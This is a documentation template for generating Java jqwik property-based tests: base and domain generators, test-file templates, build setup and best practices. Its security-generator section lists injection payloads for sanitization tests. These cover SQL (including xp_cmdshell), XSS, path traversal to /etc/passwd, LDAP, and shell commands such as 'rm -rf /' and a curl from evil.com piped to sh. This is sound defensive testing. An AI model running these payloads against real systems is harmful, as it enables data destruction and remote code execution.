# Java jqwik Generator Template

This document defines the code generation templates for Java property-based tests using [jqwik](https://jqwik.net/).

## File Structure

```
src/test/java/
└── properties/
    ├── BaseGenerator.java           # Shared base generators
    ├── Generators.java              # Domain-specific generators
    └── [Feature]PropertyTest.java   # Property tests
```

---

## Template: BaseGenerator.java

```java
// src/test/java/properties/BaseGenerator.java
// Generated by /speckit.properties
// Shared generators for property-based tests

package properties;

import net.jqwik.api.*;
import net.jqwik.api.arbitraries.*;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.UUID;

/**
 * Base generators providing common primitives for property-based tests.
 * Extend this class to create domain-specific generators.
 */
public abstract class BaseGenerator {

    // =============================================================================
    // STRING GENERATORS
    // =============================================================================

    @Provide
    public static StringArbitrary validAlphanumeric() {
        return Arbitraries.strings()
            .withCharRange('a', 'z')
            .withCharRange('A', 'Z')
            .withCharRange('0', '9')
            .ofMinLength(1)
            .ofMaxLength(100);
    }

    @Provide
    public static Arbitrary<String> validEmail() {
        return Arbitraries.emails();
    }

    @Provide
    public static Arbitrary<String> validUuid() {
        return Arbitraries.create(() -> UUID.randomUUID().toString());
    }

    @Provide
    public static Arbitrary<String> validUrl() {
        StringArbitrary domain = Arbitraries.strings()
            .withCharRange('a', 'z')
            .ofMinLength(3)
            .ofMaxLength(20);
        StringArbitrary tld = Arbitraries.of("com", "org", "net", "io", "dev");
        StringArbitrary path = Arbitraries.strings()
            .withCharRange('a', 'z')
            .ofMinLength(0)
            .ofMaxLength(50);

        return Combinators.combine(domain, tld, path)
            .as((d, t, p) -> "https://" + d + "." + t + "/" + p);
    }

    @Provide
    public static Arbitrary<String> validPhone() {
        return Arbitraries.strings()
            .withCharRange('0', '9')
            .ofLength(10)
            .map(s -> "+1" + s);
    }

    // =============================================================================
    // NUMERIC GENERATORS
    // =============================================================================

    @Provide
    public static IntegerArbitrary positiveInt() {
        return Arbitraries.integers().greaterOrEqual(1);
    }

    @Provide
    public static IntegerArbitrary nonNegativeInt() {
        return Arbitraries.integers().greaterOrEqual(0);
    }

    @Provide
    public static Arbitrary<Double> percentage() {
        return Arbitraries.doubles().between(0.0, 100.0);
    }

    @Provide
    public static Arbitrary<java.math.BigDecimal> moneyAmount() {
        return Arbitraries.bigDecimals()
            .between(java.math.BigDecimal.ZERO, new java.math.BigDecimal("999999.99"))
            .ofScale(2);
    }

    // =============================================================================
    // DATE GENERATORS
    // =============================================================================

    @Provide
    public static Arbitrary<LocalDate> futureDate() {
        return Arbitraries.dates()
            .atTheEarliest(LocalDate.now().plusDays(1))
            .atTheLatest(LocalDate.now().plusYears(10));
    }

    @Provide
    public static Arbitrary<LocalDate> pastDate() {
        return Arbitraries.dates()
            .atTheEarliest(LocalDate.now().minusYears(10))
            .atTheLatest(LocalDate.now().minusDays(1));
    }

    @Provide
    public static Arbitrary<LocalDateTime> futureDateTime() {
        return Arbitraries.dateTimes()
            .atTheEarliest(LocalDateTime.now().plusHours(1))
            .atTheLatest(LocalDateTime.now().plusYears(10));
    }

    // =============================================================================
    // UTILITY METHODS
    // =============================================================================

    /**
     * Create a weighted one-of arbitrary, preferring valid values.
     */
    protected static <T> Arbitrary<T> weightedOneOf(
            Arbitrary<T> primary,
            Arbitrary<T>... alternatives) {
        return Arbitraries.frequencyOf(
            Tuple.of(10, primary),
            Tuple.of(1, Arbitraries.oneOf(alternatives))
        );
    }
}
```

---

## Template: Generators.java

```java
// src/test/java/properties/Generators.java
// Generated by /speckit.properties
// Feature: {{FEATURE_ID}}
// Custom domain generators for property-based tests

package properties;

import net.jqwik.api.*;
import net.jqwik.api.arbitraries.*;
import net.jqwik.api.constraints.*;

import java.math.BigDecimal;
import java.time.LocalDate;
import java.util.*;

/**
 * Domain-specific generators for {{FEATURE_NAME}} property-based tests.
 */
public class Generators extends BaseGenerator {

    // =============================================================================
    // PRIMITIVE GENERATORS
    // =============================================================================

    @Provide
    public static Arbitrary<String> validUsername() {
        return Arbitraries.strings()
            .withCharRange('a', 'z')
            .withCharRange('0', '9')
            .withChars('_', '-')
            .ofMinLength(3)
            .ofMaxLength(32);
    }

    @Provide
    public static Arbitrary<String> validPassword() {
        // Ensure password meets complexity requirements
        Arbitrary<String> lower = Arbitraries.strings().withCharRange('a', 'z').ofLength(1);
        Arbitrary<String> upper = Arbitraries.strings().withCharRange('A', 'Z').ofLength(1);
        Arbitrary<String> digit = Arbitraries.strings().withCharRange('0', '9').ofLength(1);
        Arbitrary<String> special = Arbitraries.of("!", "@", "#", "$", "%");
        Arbitrary<String> rest = Arbitraries.strings()
            .withCharRange('a', 'z')
            .withCharRange('A', 'Z')
            .withCharRange('0', '9')
            .ofMinLength(4)
            .ofMaxLength(120);

        return Combinators.combine(lower, upper, digit, special, rest)
            .as((l, u, d, s, r) -> l + u + d + s + r);
    }

    // =============================================================================
    // BOUNDARY GENERATORS
    // =============================================================================

    @Provide
    public static Arbitrary<String> invalidEmail() {
        return Arbitraries.oneOf(
            Arbitraries.just(""),                              // Empty
            Arbitraries.just("@"),                             // No local part
            Arbitraries.just("a@"),                            // No domain
            Arbitraries.just("@b.com"),                        // No local part
            Arbitraries.just("a@b"),                           // No TLD
            Arbitraries.just("a@@b.com"),                      // Double @
            Arbitraries.strings().filter(s -> !s.contains("@")), // Missing @
            Arbitraries.strings()
                .filter(s -> s.chars().filter(c -> c == '@').count() > 1) // Multiple @
        );
    }

    @Provide
    public static Arbitrary<String> boundaryString() {
        return Arbitraries.oneOf(
            Arbitraries.just(""),                              // Empty
            Arbitraries.just(" "),                             // Whitespace only
            Arbitraries.just("\n"),                            // Newline only
            Arbitraries.just("\t"),                            // Tab only
            Arbitraries.just("a".repeat(1000)),                // Very long
            Arbitraries.just("a".repeat(10000)),               // Extremely long
            Arbitraries.of("\uD83C\uDF89", "\uD83C\uDF8A", "\uD83C\uDF81") // Emoji
        );
    }

    @Provide
    public static Arbitrary<Integer> boundaryInt() {
        return Arbitraries.oneOf(
            Arbitraries.just(0),
            Arbitraries.just(-1),
            Arbitraries.just(1),
            Arbitraries.just(Integer.MAX_VALUE),
            Arbitraries.just(Integer.MIN_VALUE),
            Arbitraries.just(Integer.MAX_VALUE - 1),
            Arbitraries.just(Integer.MIN_VALUE + 1)
        );
    }

    @Provide
    public static Arbitrary<Long> boundaryLong() {
        return Arbitraries.oneOf(
            Arbitraries.just(0L),
            Arbitraries.just(-1L),
            Arbitraries.just(1L),
            Arbitraries.just(Long.MAX_VALUE),
            Arbitraries.just(Long.MIN_VALUE)
        );
    }

    // =============================================================================
    // SECURITY GENERATORS
    // =============================================================================

    @Provide
    public static Arbitrary<String> sqlInjectionPayloads() {
        return Arbitraries.oneOf(
            Arbitraries.just("'; DROP TABLE users; --"),
            Arbitraries.just("' OR '1'='1"),
            Arbitraries.just("admin'--"),
            Arbitraries.just("1; SELECT * FROM users"),
            Arbitraries.just("' UNION SELECT * FROM users--"),
            Arbitraries.just("1' AND '1'='1"),
            Arbitraries.just("'; EXEC xp_cmdshell('whoami'); --"),
            Arbitraries.just("' OR 1=1--"),
            Arbitraries.just("') OR ('1'='1"),
            Arbitraries.strings()
                .filter(s -> s.contains("'") || s.contains(";"))
        );
    }

    @Provide
    public static Arbitrary<String> xssPayloads() {
        return Arbitraries.oneOf(
            Arbitraries.just("<script>alert('xss')</script>"),
            Arbitraries.just("<img src=x onerror=alert('xss')>"),
            Arbitraries.just("javascript:alert('xss')"),
            Arbitraries.just("<svg onload=alert('xss')>"),
            Arbitraries.just("'><script>alert('xss')</script>"),
            Arbitraries.just("<body onload=alert('xss')>"),
            Arbitraries.just("<iframe src='javascript:alert(1)'>"),
            Arbitraries.just("\"onfocus=\"alert('xss')\" autofocus=\""),
            Arbitraries.just("<a href=\"javascript:alert('xss')\">click</a>")
        );
    }

    @Provide
    public static Arbitrary<String> pathTraversalPayloads() {
        return Arbitraries.oneOf(
            Arbitraries.just("../../../etc/passwd"),
            Arbitraries.just("..\\..\\..\\windows\\system32"),
            Arbitraries.just("%2e%2e%2f%2e%2e%2f"),
            Arbitraries.just("....//....//"),
            Arbitraries.just("/etc/passwd"),
            Arbitraries.just("..%252f..%252f..%252fetc/passwd"),
            Arbitraries.just("..%c0%af..%c0%af..%c0%afetc/passwd")
        );
    }

    @Provide
    public static Arbitrary<String> commandInjectionPayloads() {
        return Arbitraries.oneOf(
            Arbitraries.just("; rm -rf /"),
            Arbitraries.just("| cat /etc/passwd"),
            Arbitraries.just("$(whoami)"),
            Arbitraries.just("`id`"),
            Arbitraries.just("& ping -c 10 localhost &"),
            Arbitraries.just("|| cat /etc/passwd"),
            Arbitraries.just("&& ls -la"),
            Arbitraries.just("; curl http://evil.com/shell.sh | sh")
        );
    }

    @Provide
    public static Arbitrary<String> ldapInjectionPayloads() {
        return Arbitraries.oneOf(
            Arbitraries.just("*"),
            Arbitraries.just("*)(uid=*))(|(uid=*"),
            Arbitraries.just("admin)(&)"),
            Arbitraries.just("*)(objectClass=*")
        );
    }

    // =============================================================================
    // ENTITY GENERATORS
    // =============================================================================

    {% for entity in entities %}
    // {{entity.name}} generators

    @Provide
    public static Arbitrary<{{entity.name}}> valid{{entity.name}}() {
        return Combinators.combine(
            {% for field in entity.fields %}
            {{field.valid_generator}}{% if not loop.last %},{% endif %}
            {% endfor %}
        ).as({{entity.name}}::new);
    }

    @Provide
    public static Arbitrary<{{entity.name}}> boundary{{entity.name}}() {
        return Combinators.combine(
            {% for field in entity.fields %}
            {{field.boundary_generator}}{% if not loop.last %},{% endif %}
            {% endfor %}
        ).as({{entity.name}}::new);
    }

    {% if entity.has_security_fields %}
    @Provide
    public static Arbitrary<{{entity.name}}> security{{entity.name}}() {
        return Combinators.combine(
            {% for field in entity.security_fields %}
            {{field.security_generator}}{% if not loop.last %},{% endif %}
            {% endfor %}
        ).as({{entity.name}}::new);
    }
    {% endif %}
    {% endfor %}

    // =============================================================================
    // COLLECTION GENERATORS
    // =============================================================================

    @Provide
    public static <T> Arbitrary<List<T>> validList(Arbitrary<T> element) {
        return element.list().ofMinSize(1).ofMaxSize(100);
    }

    @Provide
    public static <T> Arbitrary<Set<T>> validSet(Arbitrary<T> element) {
        return element.set().ofMinSize(1).ofMaxSize(100);
    }

    @Provide
    public static <K, V> Arbitrary<Map<K, V>> validMap(
            Arbitrary<K> keys,
            Arbitrary<V> values) {
        return Arbitraries.maps(keys, values).ofMinSize(1).ofMaxSize(50);
    }
}
```

---

## Template: Property Test File

```java
// src/test/java/properties/{{FeatureName}}PropertyTest.java
// Generated by /speckit.properties
// Feature: {{FEATURE_ID}}
// Generated: {{TIMESTAMP}}
//
// Property-Based Tests for {{FEATURE_NAME}}
// Based on: spec.md, properties.md
//
// Run: mvn test -Dtest={{FeatureName}}PropertyTest
// Run: gradle test --tests {{FeatureName}}PropertyTest

package properties;

import net.jqwik.api.*;
import net.jqwik.api.constraints.*;
import net.jqwik.api.lifecycle.*;
import net.jqwik.api.stateful.*;

import org.assertj.core.api.Assertions;
import static org.assertj.core.api.Assertions.*;

import {{module}}.*;
import {{module}}.exceptions.*;

import java.util.*;

/**
 * Property-Based Tests for {{FEATURE_NAME}}.
 * @speckit[FEATURE:{{FEATURE_ID}}]
 */
class {{FeatureName}}PropertyTest {

    // =============================================================================
    // INVERSE PROPERTIES
    // =============================================================================

    {% for prop in properties if prop.type == "inverse" %}
    /**
     * PROP-{{prop.id}}: {{prop.description}}
     * Trace: {{prop.trace}}
     * Formula: {{prop.formula}}
     * @speckit[PROP:{{prop.id}},{{prop.trace_annotation}}]
     */
    @Property(tries = 100)
    @Report(Reporting.GENERATED)
    void {{prop.name}}_inverse(@ForAll("{{prop.generator}}") {{prop.input_type}} value) {
        // Forward operation
        {{prop.result_type}} result = {{prop.forward_function}}(value);
        assertThat({{prop.forward_assertion}}).isTrue();

        // Inverse operation
        {{prop.input_type}} recovered = {{prop.inverse_function}}(result);

        // Round-trip assertion
        assertThat(recovered)
            .as("Inverse property violated: %s -> %s -> %s", value, result, recovered)
            .isEqualTo(value);
    }

    @Example
    void {{prop.name}}_inverse_shrunkExample() {
        // Shrunk example from previous failure
        {% for ex in prop.shrunk_examples %}
        {{prop.input_type}} value = {{ex.java_value}};
        {{prop.result_type}} result = {{prop.forward_function}}(value);
        {{prop.input_type}} recovered = {{prop.inverse_function}}(result);
        assertThat(recovered).isEqualTo(value);
        {% endfor %}
    }

    {% endfor %}

    // =============================================================================
    // IDEMPOTENT PROPERTIES
    // =============================================================================

    {% for prop in properties if prop.type == "idempotent" %}
    /**
     * PROP-{{prop.id}}: {{prop.description}}
     * Trace: {{prop.trace}}
     * Formula: {{prop.formula}}
     * @speckit[PROP:{{prop.id}},{{prop.trace_annotation}}]
     */
    @Property(tries = 100)
    void {{prop.name}}_idempotent(@ForAll("{{prop.generator}}") {{prop.input_type}} value) {
        // Apply once
        {{prop.result_type}} once = {{prop.function}}(value);

        // Apply twice
        {{prop.result_type}} twice = {{prop.function}}(once);

        // Idempotent assertion
        assertThat(twice)
            .as("Idempotent violated: f(%s) = %s, f(f(%s)) = %s", value, once, value, twice)
            .isEqualTo(once);
    }

    @Example
    void {{prop.name}}_idempotent_shrunkExamples() {
        {% for ex in prop.shrunk_examples %}
        // Found: {{ex.date}}, Iteration: {{ex.iteration}}
        {{prop.input_type}} value = {{ex.java_value}};
        {{prop.result_type}} once = {{prop.function}}(value);
        {{prop.result_type}} twice = {{prop.function}}(once);
        assertThat(twice).isEqualTo(once);
        {% endfor %}
    }

    {% endfor %}

    // =============================================================================
    // INVARIANT PROPERTIES
    // =============================================================================

    {% for prop in properties if prop.type == "invariant" %}
    /**
     * PROP-{{prop.id}}: {{prop.description}}
     * Trace: {{prop.trace}}
     * Formula: {{prop.formula}}
     * {% if prop.statistical %}Statistical: Yes (samples={{prop.sample_size}}){% endif %}
     * @speckit[PROP:{{prop.id}},{{prop.trace_annotation}}]
     */
    @Property(tries = {{prop.sample_size if prop.statistical else 100}})
    void {{prop.name}}_invariant(@ForAll("{{prop.generator}}") {{prop.state_type}} state) {
        {% if prop.conditional %}
        // Precondition
        Assume.that({{prop.condition}});
        {% endif %}

        // Operation
        {{prop.result_type}} result = {{prop.operation}}(state);

        // Invariant check
        assertThat({{prop.invariant_check}})
            .as("Invariant violated for state %s: result = %s", state, result)
            .isTrue();
    }

    {% endfor %}

    // =============================================================================
    // BOUNDARY PROPERTIES
    // =============================================================================

    {% for prop in properties if prop.type == "boundary" %}
    /**
     * PROP-{{prop.id}}: {{prop.description}}
     * Trace: {{prop.trace}}
     * Severity: {{prop.severity}}
     * {% if prop.security_category %}Security: {{prop.security_category}}{% endif %}
     * Formula: {{prop.formula}}
     * EARS: {{prop.ears_form}}
     * @speckit[PROP:{{prop.id}},{{prop.trace_annotation}}]
     */
    @Property(tries = 100)
    void {{prop.name}}_boundary(@ForAll("{{prop.boundary_generator}}") {{prop.input_type}} boundaryValue) {
        // Should throw expected exception for boundary values
        assertThatThrownBy(() -> {{prop.operation}}(boundaryValue))
            .isInstanceOf({{prop.expected_exception}}.class);
    }

    @Example
    void {{prop.name}}_boundary_shrunkExamples() {
        {% for ex in prop.shrunk_examples %}
        // Found: {{ex.date}}, Iteration: {{ex.iteration}}
        {{prop.input_type}} value = {{ex.java_value}};
        assertThatThrownBy(() -> {{prop.operation}}(value))
            .isInstanceOf({{prop.expected_exception}}.class);
        {% endfor %}
    }

    {% if prop.security_category %}
    /**
     * Security Property: {{prop.security_category}}
     * @speckit[PROP:{{prop.id}},{{prop.trace_annotation}},SEC:{{prop.security_category}}]
     */
    @Property(tries = 100)
    void {{prop.name}}_security(@ForAll("{{prop.security_generator}}") String attackPayload) {
        try {
            {{prop.result_type}} result = {{prop.operation}}(attackPayload);
            // If didn't throw, verify it was sanitized
            assertThat({{prop.sanitization_check}})
                .as("Security violation: %s was not sanitized", attackPayload)
                .isTrue();
        } catch ({{prop.expected_exception}} e) {
            // Expected - invalid input rejected
        } catch (Exception e) {
            // Check for security-related errors
            assertThat(e.getMessage().toUpperCase())
                .as("Possible security vulnerability: %s", e)
                .doesNotContain("{{prop.security_error_pattern}}");
        }
    }
    {% endif %}

    {% endfor %}

    // =============================================================================
    // COMMUTATIVE PROPERTIES
    // =============================================================================

    {% for prop in properties if prop.type == "commutative" %}
    /**
     * PROP-{{prop.id}}: {{prop.description}}
     * Trace: {{prop.trace}}
     * Formula: {{prop.formula}}
     * @speckit[PROP:{{prop.id}},{{prop.trace_annotation}}]
     */
    @Property(tries = 100)
    void {{prop.name}}_commutative(
            @ForAll("{{prop.generator_a}}") {{prop.type_a}} a,
            @ForAll("{{prop.generator_b}}") {{prop.type_b}} b) {
        // Both orders
        {{prop.result_type}} resultAB = {{prop.function}}(a, b);
        {{prop.result_type}} resultBA = {{prop.function}}(b, a);

        // Commutative assertion
        assertThat(resultAB)
            .as("Commutative violated: f(%s, %s) = %s, f(%s, %s) = %s",
                a, b, resultAB, b, a, resultBA)
            .isEqualTo(resultBA);
    }

    {% endfor %}

    // =============================================================================
    // MODEL-BASED PROPERTIES (Stateful Testing)
    // =============================================================================

    {% for prop in properties if prop.type == "model_based" %}
    /**
     * PROP-{{prop.id}}: {{prop.description}}
     * Trace: {{prop.trace}}
     * @speckit[PROP:{{prop.id}},{{prop.trace_annotation}}]
     *
     * Model-based testing using jqwik stateful testing.
     * The model is a simplified version of the system that's easy to verify.
     */
    @Property(tries = 100)
    void {{prop.name}}_modelBased(@ForAll("{{prop.name}}Actions") ActionSequence<{{prop.model_class}}> actions) {
        actions.run(new {{prop.model_class}}());
    }

    @Provide
    Arbitrary<ActionSequence<{{prop.model_class}}>> {{prop.name}}Actions() {
        return Arbitraries.sequences(Arbitraries.oneOf(
            {% for action in prop.actions %}
            {{action.name}}Action(){% if not loop.last %},{% endif %}
            {% endfor %}
        ));
    }

    {% for action in prop.actions %}
    private Arbitrary<Action<{{prop.model_class}}>> {{action.name}}Action() {
        return Combinators.combine(
            {% for param in action.params %}
            {{param.generator}}{% if not loop.last %},{% endif %}
            {% endfor %}
        ).as(({% for param in action.params %}{{param.name}}{% if not loop.last %}, {% endif %}{% endfor %}) ->
            new Action<{{prop.model_class}}>() {
                @Override
                public boolean precondition({{prop.model_class}} model) {
                    return {{action.guard}};
                }

                @Override
                public {{prop.model_class}} run({{prop.model_class}} model) {
                    // Apply to model
                    {{action.model_update}};

                    // Apply to real system
                    {{action.real_update}};

                    // Assert consistency
                    assertThat(model.getSystemState())
                        .as("State mismatch after {{action.name}}")
                        .isEqualTo(model.getModelState());

                    return model;
                }

                @Override
                public String toString() {
                    return String.format("{{action.name}}({% for param in action.params %}%s{% if not loop.last %}, {% endif %}{% endfor %})",
                        {% for param in action.params %}{{param.name}}{% if not loop.last %}, {% endif %}{% endfor %});
                }
            });
    }

    {% endfor %}

    /**
     * Model class for {{prop.name}} stateful testing.
     */
    static class {{prop.model_class}} {
        private {{prop.model_state_type}} modelState;
        private {{prop.real_class}} realSystem;

        public {{prop.model_class}}() {
            this.modelState = {{prop.initial_model_state}};
            this.realSystem = new {{prop.real_class}}();
        }

        public {{prop.model_state_type}} getModelState() {
            return modelState;
        }

        public {{prop.model_state_type}} getSystemState() {
            return realSystem.getState();
        }

        {% for method in prop.model_methods %}
        public void {{method.name}}({{method.params}}) {
            {{method.body}}
        }

        public boolean can{{method.name|title}}({{method.params}}) {
            return {{method.guard}};
        }
        {% endfor %}
    }

    {% endfor %}

    // =============================================================================
    // GENERATOR PROVIDERS
    // =============================================================================

    {% for generator in generators %}
    @Provide
    Arbitrary<{{generator.type}}> {{generator.name}}() {
        return {{generator.implementation}};
    }
    {% endfor %}
}
```

---

## Running Tests

### Maven

```bash
# Run all property tests
mvn test -Dtest="*PropertyTest"

# Run specific property test class
mvn test -Dtest={{FeatureName}}PropertyTest

# Run with more tries
mvn test -Dtest="*PropertyTest" -Djqwik.tries=1000

# Run with seed for reproducibility
mvn test -Dtest="*PropertyTest" -Djqwik.seed=12345

# Run with verbose output
mvn test -Dtest="*PropertyTest" -Djqwik.reporting=VERBOSE

# Run with coverage
mvn test -Dtest="*PropertyTest" jacoco:report
```

### Gradle

```bash
# Run all property tests
gradle test --tests "*PropertyTest"

# Run specific property test class
gradle test --tests {{FeatureName}}PropertyTest

# Run with more tries
gradle test --tests "*PropertyTest" -Djqwik.tries=1000

# Run with seed for reproducibility
gradle test --tests "*PropertyTest" -Djqwik.seed=12345

# Run with verbose output
gradle test --tests "*PropertyTest" -Djqwik.reporting=VERBOSE

# Run with debug output
gradle test --tests "*PropertyTest" --info
```

---

## Build Configuration

### Maven (pom.xml)

```xml
<dependencies>
    <!-- jqwik property-based testing -->
    <dependency>
        <groupId>net.jqwik</groupId>
        <artifactId>jqwik</artifactId>
        <version>1.8.2</version>
        <scope>test</scope>
    </dependency>

    <!-- AssertJ for fluent assertions -->
    <dependency>
        <groupId>org.assertj</groupId>
        <artifactId>assertj-core</artifactId>
        <version>3.24.2</version>
        <scope>test</scope>
    </dependency>
</dependencies>

<build>
    <plugins>
        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-surefire-plugin</artifactId>
            <version>3.2.2</version>
            <configuration>
                <includes>
                    <include>**/*PropertyTest.java</include>
                </includes>
            </configuration>
        </plugin>
    </plugins>
</build>
```

### Gradle (build.gradle.kts)

```kotlin
dependencies {
    testImplementation("net.jqwik:jqwik:1.8.2")
    testImplementation("org.assertj:assertj-core:3.24.2")
}

tasks.test {
    useJUnitPlatform {
        includeEngines("jqwik")
    }
}
```

---

## Best Practices

### 1. Use @Example for Shrunk Cases (Regression Tests)

```java
@Property
void encodeDecodeRoundTrip(@ForAll @StringLength(max = 100) String input) {
    String encoded = encode(input);
    String decoded = decode(encoded);
    assertThat(decoded).isEqualTo(input);
}

@Example
void encodeDecodeRoundTrip_shrunkExample() {
    // Minimal counterexample found during property testing
    String input = "\u0000";  // Found: 2024-01-15
    String encoded = encode(input);
    String decoded = decode(encoded);
    assertThat(decoded).isEqualTo(input);
}
```

### 2. Use Assume.that() for Preconditions

```java
@Property
void squareRootProperty(@ForAll @IntRange(min = Integer.MIN_VALUE) int n) {
    Assume.that(n >= 0);  // Only test non-negative numbers
    double sqrt = Math.sqrt(n);
    assertThat(sqrt * sqrt).isCloseTo(n, Percentage.withPercentage(0.0001));
}
```

### 3. Use @From for Specific Generators

```java
@Property
void userCreation(
        @ForAll @From("validEmail") String email,
        @ForAll @From("validPassword") String password) {
    User user = createUser(email, password);
    assertThat(user.getEmail()).isEqualTo(email);
}
```

### 4. Custom Arbitraries with Constraints

```java
@Provide
Arbitrary<String> validPassword() {
    return Arbitraries.strings()
        .withCharRange('a', 'z')
        .withCharRange('A', 'Z')
        .withCharRange('0', '9')
        .withChars('!', '@', '#', '$')
        .ofMinLength(8)
        .ofMaxLength(128)
        .filter(p -> p.chars().anyMatch(Character::isUpperCase))
        .filter(p -> p.chars().anyMatch(Character::isLowerCase))
        .filter(p -> p.chars().anyMatch(Character::isDigit));
}
```

### 5. Use Combinators for Complex Objects

```java
@Provide
Arbitrary<User> validUser() {
    return Combinators.combine(
        Arbitraries.emails(),
        validPassword(),
        Arbitraries.strings().ofMinLength(1).ofMaxLength(100)
    ).as(User::new);
}
```

### 6. Stateful Testing with ActionSequence

```java
@Property
void shoppingCartStateMachine(@ForAll("cartActions") ActionSequence<CartState> actions) {
    actions.run(new CartState());
}

@Provide
Arbitrary<ActionSequence<CartState>> cartActions() {
    return Arbitraries.sequences(Arbitraries.oneOf(
        addItemAction(),
        removeItemAction(),
        clearCartAction()
    ));
}

private Arbitrary<Action<CartState>> addItemAction() {
    return Arbitraries.strings().ofMinLength(1).map(itemName ->
        new Action<CartState>() {
            @Override
            public CartState run(CartState state) {
                state.addItem(itemName);
                assertThat(state.contains(itemName)).isTrue();
                return state;
            }
        });
}
```

### 7. Use @Report for Debugging

```java
@Property
@Report(Reporting.GENERATED)  // Show all generated values
void debugProperty(@ForAll String input) {
    // Values will be printed to console
    assertThat(process(input)).isNotNull();
}
```

### 8. Configure Shrinking Behavior

```java
@Property(shrinking = ShrinkingMode.FULL)  // Thorough shrinking
void thoroughProperty(@ForAll List<Integer> list) {
    // ...
}

@Property(shrinking = ShrinkingMode.OFF)  // Disable for performance
void fastProperty(@ForAll @Size(max = 1000) List<Integer> list) {
    // ...
}
```

### 9. Edge Cases with @WithNull and @Unique

```java
@Property
void nullHandling(@ForAll @WithNull(0.1) String input) {
    // 10% of inputs will be null
    Result result = process(input);
    if (input == null) {
        assertThat(result.isError()).isTrue();
    } else {
        assertThat(result.isSuccess()).isTrue();
    }
}

@Property
void uniqueElements(@ForAll @Size(10) @UniqueElements List<String> items) {
    // All elements are guaranteed unique
    assertThat(new HashSet<>(items)).hasSize(items.size());
}
```

### 10. Domain-Driven Arbitrary Composition

```java
@Provide
Arbitrary<Order> validOrder() {
    return Combinators.combine(
        validCustomer(),
        validOrderItems().list().ofMinSize(1).ofMaxSize(10),
        validShippingAddress()
    ).as((customer, items, address) -> {
        Order order = new Order(customer, address);
        items.forEach(order::addItem);
        return order;
    }).filter(Order::isValid);
}
```
